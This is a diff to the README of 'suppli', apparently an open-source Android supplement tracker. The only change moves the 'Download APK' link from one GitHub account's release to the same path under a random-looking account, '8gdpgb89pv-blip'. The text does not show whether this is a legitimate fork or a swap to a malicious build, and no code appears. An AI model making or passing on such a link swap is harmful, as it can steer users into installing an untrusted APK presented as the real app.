@@ -7,7 +7,7 @@
 A beautiful, fluid, and Free and Open Source (FOSS) Android supplement tracker built with **Kotlin** and modern **Jetpack Compose Material 3**. Track your daily vitamins, minerals, and pills with satisfying micro-interactions, spring physics, and organic UI.
 
 <p align="center">
-  <a href="https://github.com/ukuw/suppli/releases/download/version/suppli.apk">
+  <a href="https://github.com/8gdpgb89pv-blip/suppli/releases/download/version/suppli.apk">
     <img width="280" height="120" alt="Download APK" src="https://github.com/user-attachments/assets/ef0eb196-72c7-4593-8d07-d4e6367b5b76" />
   </a>
 </p>
